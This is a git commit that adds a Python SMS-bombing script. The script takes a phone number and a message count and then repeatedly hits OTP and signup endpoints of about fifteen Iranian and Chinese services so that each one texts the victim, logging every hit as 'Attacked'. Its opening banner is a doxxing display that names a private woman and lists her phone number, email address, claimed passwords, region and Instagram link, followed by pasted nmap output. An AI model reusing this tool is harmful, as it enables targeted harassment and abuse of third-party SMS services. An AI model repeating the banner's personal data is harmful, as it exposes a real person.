c533fdfd62c7731b209d5be060650579885b0d13
Davil611 <167523162+Davil611@users.noreply.github.com>
2024-05-04 15:20:48 +0530

    Create Davjani.py

---
+++ Davjani.py
@@ -0,0 +1,560 @@
+
+from requests import post , get
+from time import sleep
+from os import system , name
+
+
+
+
+# script coding by samir
+
+
+
+def logo() :
+ print(color.GREEN+"""
+\n
+    ===================================================================================
+    welcome my syber world 🌎 🌍 👿👿👿👿
+    username = @davil611(samir)
+    password =*************@samir
+=====================================================================================
+#scaning ISP..........
+  #victim mobile number = +9193829105
+    #scanning adress.........
+      #country = india
+        #state= West Bengal 
+          #user name = Debjani Jana
+            #true caller id = https://truecaller.com/search/in/+919382910586
+            @current location .......
+         # according caller ID = https://www.google.com/search?q=google+map+contai&client=ms-android-motorola&sca_esv=718de0e0157e66f8&sca_upv=1&ei=rvQ1Zo6QM76xseMPp5y0yAw&oq=google+map+contai&gs_lp=EhNtb2JpbGUtZ3dzLXdpei1zZXJwIhFnb29nbGUgbWFwIGNvbnRhaTIGEAAYFhgeMgYQABgWGB4yBhAAGBYYHjIGEAAYFhgeMgYQABgWGB4yBhAAGBYYHjIGEAAYFhgeMgYQABgWGB5IupEBUJ8_WJmLAXADeAKQAQCYAagMoAHbS6oBEDAuMi4xMC41LjUuMi44LTG4AQPIAQD4AQGYAg6gAqobwgIEEAAYR8ICBxAhGKABGArCAgQQIRgVwgIFECEYoAHCAhEQABiABBiRAhixAxjJAxiKBcICCBAAGIAEGJIDwgILEAAYgAQYkgMYigXCAg4QABiABBiRAhixAxiKBcICCxAAGIAEGJECGIoFwgIREAAYgAQYkQIYsQMYgwEYigXCAhMQABiABBiRAhixAxgCGIoFGJ8BwgIIEAAYgAQYsQPCAgUQABiABMICCxAAGIAEGIYDGIoFmAMAiAYBkAYIkgcJMy4xLjYuMi4yoAeAbw&sclient=mobile-gws-wiz-serp
+       @Android  details ....
+     #total install app =313
+   #android version = 12
+ #ip adress = 196:65:0:15
+#ipv6 = a6:c3:d5:h7:f2:v5
+ # email address= janadavjani308@gmail.com
+   #password = davjani308 (this is increpted)
+     #social midea foot print .........
+        #instagram link = https://www.google.com/search?q=dabjani+jana+contai+instagram+account&oq=dabjani+jana+contai+i&gs_lcrp=EgZjaHJvbWUqCQgFECEYChigATIGCAAQRRg5MgkIARAhGAoYoAEyCQgCECEYChigATIJCAMQIRgKGKABMgkIBBAhGAoYoAEyCQgFECEYChigATIHCAYQIRifBTIHCAcQIRifBTIHCAgQIRifBTIHCAkQIRifBdIBCTIwMjY1ajBqOagCALACAA&client=ms-android-motorola&sourceid=chrome-mobile&ie=UTF-8#vhid=zephyr:0&vssid=atritem-https://www.instagram.com/mortal_rainbow/&ip=1
+          # password= gh46ic224(this is increpted)
+            #face book link = not found 
+               #password = not found for data base
+                 #nmap scaning start.......
+  -sN/sF/sX: TCP Null, FIN, and Xmas scans
+  --scanflags <flags>: Customize TCP scan flags
+  -sI <zombie host[:probeport]>: Idle scan
+  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
+  -sO: IP protocol scan
+  -b <FTP relay host>: FTP bounce scan
+PORT SPECIFICATION AND SCAN ORDER:
+  -p <port ranges>: Only scan specified ports
+    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
+  --exclude-ports <port ranges>: Exclude the specified ports from scanning
+  -F: Fast mode - Scan fewer ports than the default scan
+  -r: Scan ports sequentially - don't randomize
+  --top-ports <number>: Scan <number> most common ports
+  --port-ratio <ratio>: Scan ports more common than <ratio>
+SERVICE/VERSION DETECTION:
+  -sV: Probe open ports to determine service/version info
+  --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
+  --version-light: Limit to most likely probes (intensity 2)
+  --version-all: Try every single probe (intensity 9)
+  --version-trace: Show detailed version scan activity (for debugging)
+SCRIPT SCAN:
+  -sC: equivalent to --script=default
+  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
+           directories, script-files or script-categories
+  --script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
+  --script-args-file=filename: provide NSE script args in a file
+  --script-trace: Show all data sent and received
+  --script-updatedb: Update the script database.
+  --script-help=<Lua scripts>: Show help about scripts.
+           <Lua scripts> is a comma-separated list of script-files or
+           script-categories.
+OS DETECTION:
+  -O: Enable OS detection
+  --osscan-limit: Limit OS detection to promising targets
+  --osscan-guess: Guess OS more aggressively
+TIMING AND PERFORMANCE:
+  Options which take <time> are in seconds, or append 'ms' (milliseconds),
+  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
+  -T<0-5>: Set timing template (higher is faster)
+  --min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes
+  --min-parallelism/max-parallelism <numprobes>: Probe parallelization
+  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies
+      probe round trip time.
+  --max-retries <tries>: Caps number of port scan probe retransmissions.
+  --host-timeout <time>: Give up on target after this long
+  --scan-delay/--max-scan-delay <time>: Adjust delay between probes
+  --min-rate <number>: Send packets no slower than <number> per second
+  --max-rate <number>: Send packets no faster than <number> per second
+FIREWALL/IDS EVASION AND SPOOFING:
+  -f; --mtu <val>: fragment packets (optionally w/given MTU)
+  -D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
+  -S <IP_Address>: Spoof source address
+  -e <iface>: Use specified interface
+  -g/--source-port <portnum>: Use given port number
+  --proxies <url1,[url2],...>: Relay connections through HTTP/SOCKS4 proxies
+  --data <hex string>: Append a custom payload to sent packets
+  --data-string <string>: Append a custom ASCII string to sent packets
+  --data-length <num>: Append random data to sent packets
+  --ip-options <options>: Send packets with specified ip options
+  --ttl <val>: Set IP time-to-live field
+  --spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
+  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
+OUTPUT:
+  -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
+     and Grepable format, respectively, to the given filename.
+  -oA <basename>: Output in the three major formats at once
+  -v: Increase verbosity level (use -vv or more for greater effect)
+  -d: Increase debugging level (use -dd or more for greater effect)
+  --reason: Display the reason a port is in a particular state
+  --open: Only show open (or possibly open) ports
+  --packet-trace: Show all packets sent and received
+  --iflist: Print host interfaces and routes (for debugging)
+  --append-output: Append to rather than clobber specified output files
+  --resume <filename>: Resume an aborted scan
+  --noninteractive: Disable runtime interactions via keyboard
+  --stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
+  --webxml: Reference stylesheet from Nmap.Org for more portable XML
+  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
+MISC:
+  -6: Enable IPv6 scanning
+  -A: Enable OS detection, version detection, script scanning, and traceroute
+  --datadir <dirname>: Specify custom Nmap data file location
+  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
+  --privileged: Assume that the user is fully privileged
+  --unprivileged: Assume the user lacks raw socket privileges
+  -V: Print version number
+  -h: Print this help summary page.
+EXAMPLES:
+  nmap -v -A scanme.nmap.org
+  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
+  nmap -v -iR 10000 -Pn -p 80
+SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
+~ $ nmap 196:0.0.115
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 14:58 IST
+Failed to resolve "196:0.0.115".
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 0.61 seconds
+~ $ nmap 100.75.164.124/24
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 15:00 IST
+"""+color.GREEN)
+
+
+
+class color: 
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    RED = '\033[91m'
+    PURPLE = '\033[95m'
+
+
+def clear():
+    #for win
+    if name == 'nt':
+        _ = system('cls')
+    
+    else:
+        _ = system('clear')
+
+
+
+
+
+sended = []
+
+def log(looping_count, sms_number, phone_number):
+    clear()
+    logo()
+
+    return_200 = str(sended.count(1))
+    return_error = str(sended.count(0))
+    return_internet_error = str(sended.count(-1))
+
+    print("----------------------------------------------------")
+    print("[-] Attack Started To : 98 {}".format(phone_number))
+    print("\n\n[*] Attacked: {}/{}    Bad Post: {}    Connection Time Out: {}".format(return_200, sms_number, return_error, return_internet_error))
+    print("\n[*] all lo0ping script : {}".format(looping_count))
+    print("----------------------------------------------------")
+
+
+# dos loop
+ 
+def start():
+    looping_count = 0
+
+    clear()
+    # input data
+    logo()
+    print("\n\n")
+    phone_number = str(input("Phone Number?:\n>>+98 "))
+    sms_number = int(input("How Much Message?:\n>>"))
+
+    while looping_count <= sms_number:
+
+        if sended.count(1) >= sms_number:
+            clear()
+            log(looping_count, sms_number, phone_number)
+            print("\n[ ] Done, I sent more than {} sms to +98 {}\n".format(sms_number, phone_number ))
+            break
+        
+        else:
+            # print status log
+            log(looping_count, sms_number, phone_number)
+
+            looping_count = looping_count + 1
+            
+            # run site function'
+            snap(phone_number)
+            sleep(0)
+            tamland(phone_number)
+            sleep(0)
+            alibaba(phone_number)
+            sleep(0)
+            tapsi(phone_number)
+            sleep(0)
+            divar(phone_number)
+            sleep(0)
+            sbm24(phone_number)
+            sleep(0)
+            anten(phone_number)
+            sleep(0)
+            snap_doctor(phone_number)
+            sleep(0)
+            togmond(phone_number)
+            sleep(0)
+            torob(phone_number)
+            sleep(0)
+            idifeng(phone_number)
+            sleep(0)
+            passhujiangcom(phone_number)
+            sleep(0)
+            zgtvspo38igeekgq(phone_number)
+            sleep(0)
+            apiwanwudezhicom(phone_number)
+            sleep(0)
+            
+
+            # sleep time after 1 looping
+            #sleep(1)
+
+
+
+
+
+###############                  ###############               
+###### site function     configs    start ######
+###############                  ###############
+
+
+# 001 snap
+def snap(phone_number):
+    try:
+        phone_number = "+98" + phone_number
+        data = {"cellphone":phone_number}
+        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
+        p = post(url, json=data, timeout=2)
+        sleep(0)
+        
+        rp = p.status_code
+        if rp == 200 :
+            sended.append(1)
+            print("[snap]  Attacked : {}".format(p))
+            
+        else:
+            print("[-snap] Bad Post , error code:{}".format(p))
+            sended.append(0)
+    except:
+        print("[-snap] Connection Time Out..")
+        sended.append(-1)
+        
+
+
+# 002 tamland
+def tamland(phone_number):
+    try:
+        phone_number = "0" + phone_number
+        
+
+        data = {"Mobile":phone_number,"SchoolId":-1}
+        url = "https://api.famiran.com/api/user/signup"
+        p = post(url, json=data, timeout=2)
+        sleep(0)
+        
+        rp = p.status_code
+        if rp == 200 :
+            sended.append(1)
+            print("[tamland] Attacked : {}".format(p))
+            
+        else:
+            print("[-tamland] Bad Post, error code: {}".format(p))
+            sended.append(0)
+    except:
+        print("[-tamland] Connection Time Out..")
+        sended.append(-1)
+        
+
+
+# 003 alibaba 
+def alibaba(phone_number):
+    try:
+        phone_number = phone_number
+        url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
+        data = {"phoneNumber":phone_number}
+        p = post(url, json=data, timeout=3)
+        sleep(0)
+        
+        rp = p.status_code
+        if rp == 200 :
+            sended.append(1)
+            print("[alibaba] Attacked : {}".format(p))
+            
+        else: 
+            print("[-alibaba] Bad Post, error code: {}".format(p))
+            sended.append(0)
+    except:
+        print("[-alibaba] Connection Time Out..")
+        sended.append(-1)
+
+# 004 tapsi -limit
+def tapsi(phone_number):
+    try:
+        phone_number = "0" + phone_number
+        data = {"credential":{"phoneNumber":phone_number,"role":"PASSENGER"}}
+        url = "https://tap33.me/api/v2/user"
+        p = post(url, json=data, timeout=2 )
+        sleep(0)
+        rp = p.status_code
+        if rp == 200:
+            sended.append(1)
+            print("[tapsi] Attacked : {}".format(p))
+        else:
+            print("[-tapsi] Bad Post, error code: {}".format(p))
+            sended.append(0)
+    except:
+        print("[-tapsi] Connection Time Out..")
+        sended.append(-1)
+
+# 005 divar
+def divar(phone_number):
+    try:
+        phone_number = phone_number
+        data = {"phone":phone_number}
+        url = "https://api.divar.ir/v5/auth/authenticate"
+        p = post(url, json=data, timeout=2)
+        rp = p.status_code
+        sleep(0)
+        if rp == 200:
+            sended.append(1)
+            print("[divar] Attacked : {}".format(p))
+        else:
+            print("[-divar] Bad Post, error code: {}".format(p))
+            sended.append(0)
+    except:
+        print("[-divar] Connection Time Out..")
+        sended.append(-1)
+
+
+# 006 sbm24 -limit
+def sbm24(phone_number):
+    try:
+        data = {}
+        url = "https://sandbox.sbm24.net/api/v2/authenticate/send-confirmation-code?mobile=0{}".format(phone_number)
+        p = post(url, json=data, timeout=3)
+        rp = p.status_code
+        sleep(0)
+        if rp == 200:
+            sended.append(1)
+            print("[sbm24] Attacked : {}".format(p))
+        else:
+            print("[-sbm24] Bad Post, error code: {}".format(p))
+            sended.append(0)
+    except:
+        print("[-sbm24] Connection Time Out..")
+        sended.append(-1)
+
+
+
+# 007 snap market
+def snap_market(phone_number):
+    try:
+
+        data = {}
+        url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{}&dummy=1603885783456".format(phone_number)
+        p = post(url, json=data, timeout=3)
+        rp = p.status_code
+        sleep(0)
+        if rp == 200:
+            sended.append(1)
+            print("[snap_market] Attacked : {}".format(p))
+        else:
+            print("[-snap_market] Bad Post, error code: {}".format(p))
+            sended.append(0)
+    except:
+        print("[-snap_market] Connection Time Out..")
+        sended.append(-1)
+
+
+
+# 008 anten *
+def anten(phone_number):
+    try:
+        phone_number = '0'+phone_number
+        data = {"phone":phone_number}
+        url = "https://api2.anten.ir/users/"
+        p = post(url, json=data, timeout=3)
+        rp = p.status_code
+        sleep(0)
+        if rp == 200:
+            sended.append(1)
+            print("[anten] Attacked : {}".format(p))
+        else:
+            print("[-anten] Bad Post, error code: {}".format(p))
+            sended.append(0)
+    except:
+        print("[-anten] Connection Time Out..")
+        sended.append(-1)
+
+
+# 009 snap doctor *
+def snap_doctor(phone_number):
+    try:
+        url = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{}/sms?cCode=+98)".format(phone_number)
+        p = get(url, timeout=3)
+        rp = p.json()
+        rp = rp["result"]
+        sleep(0)
+        if rp == "SUCCESS":
+            sended.append(1)
+            print("[snap doctor] send get and : {}".format(rp))
+    except:
+        print("[-snap doctor] Connection Time Out..")
+        sended.append(-1)
+
+
+# 010 togmond *
+def togmond(phone_number):
+    try:
+        phone_number = phone_number
+        data = "utf8=%E2%9C%93&phone_number=0{}".format(phone_number)
+        url = "https://tagmond.com/phone_number"
+        p = post(url, data=data, timeout=3)
+        rp = p.status_code
+        sleep(0)
+        if rp == 200:
+            sended.append(2) # for 10 try : dont send sms bot return 200!
+            print("[togmond] Attacked : {}".format(p))
+        else:
+            print("[-togmond] Bad Post, error code: {}".format(p))
+            sended.append(0)
+    except:
+        print("[-togmond] Connection Time Out..")
+        sended.append(-1)
+
+
+# 011 torob
+def torob(phone_number):
+    try:
+        url = "https://api.torob.com/a/phone/send-pin/?phone_number=0{}".format(phone_number)
+        p = get(url, timeout=3)
+        rp = p.status_code
+        sleep(0)
+        if rp == 200:
+            sended.append(1)
+            print("[torob] Attacked : {}".format(p))
+        else:
+            print("[-torob] Bad Post, error code: {}".format(p))
+            sended.append(0)
+    except:
+        print("[-torob] Connection Time Out..")
+        sended.append(-1)
+
+#012id.ifeng
+def idifeng(phone_number):
+    try:
+        data = {"username":"+98"+phone_number}    
+        url = "http://id.ifeng.com/api/simplesendmsg?mobile=%s"
+        p = post(url, json=data, timeout=2)
+        sleep(0)
+        rp = p.status_code
+        if rp == 200:
+            sended.append(1)
+            print("[id.ifeng] Attacked : {}".format(p))
+        else:
+            print("[-id.ifeng] Bad Post, error code: {}".format(p))
+            sended.append(0)
+    except:
+        print("[-id.ifeng] Connection Time Out..")
+        sended.append(-1)
+
+# 013 passhujiangcom
+def passhujiangcom(phone_number):
+    try:
+        data = {"username":"+98"+phone_number}    
+        url = "https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile=%s"
+        p = post(url, json=data, timeout=2)
+        sleep(0)
+        rp = p.status_code
+        if rp == 200:
+            sended.append(1)
+            print("[pass.hujiang] Attacked : {}".format(p))
+        else:
+            print("[-pass.hujiang] Bad Post, error code: {}".format(p))
+            sended.append(0)
+    except:
+        print("[-pass.hujiang] Connection Time Out..")
+        sended.append(-1)
+
+# 014 zgtvspo38igeekgq
+def zgtvspo38igeekgq(phone_number):
+    try:
+        url = "http://zgtv.spo38.igeek.gq/aip/index3.php?hm={}".format(phone_number)
+        p = get(url, timeout=3)
+        rp = p.status_code
+        sleep(0)
+        if rp == 200:
+            sended.append(1)
+            print("[zgtv.spo38.igeek] Attacked : {}".format(p))
+        else:
+            print("[-zgtv.spo38.igeek] Bad Post, error code: {}".format(p))
+            sended.append(0)
+    except:
+        print("[-zgtv.spo38.igeek] Connection Time Out..")
+        sended.append(-1)
+
+# 015 apiwanwudezhicom
+def apiwanwudezhicom(phone_number):
+    try:
+        data = {"username":"+98"+phone_number}    
+        url = "https://api.wanwudezhi.com/module-user/api/v1/user/sendSmsCode?phone=%s"
+        p = post(url, json=data, timeout=2)
+        sleep(0)
+        rp = p.status_code
+        if rp == 200:
+            sended.append(1)
+            print("[api.wanwudezhi] Attacked : {}".format(p))
+        else:
+            print("[-api.wanwudezhi] Bad Post, error code: {}".format(p))
+            sended.append(0)
+    except:
+        print("[-api.wanwudezhi] Connection Time Out..")
+        sended.append(-1)
+
+
+
+site_function = 15
+###############                  ###############               
+###### site function     configs    end   ######
+###############                  ###############
+
+
+if __name__ == "__main__":
+    start()
+
+
+
+
+
+
+
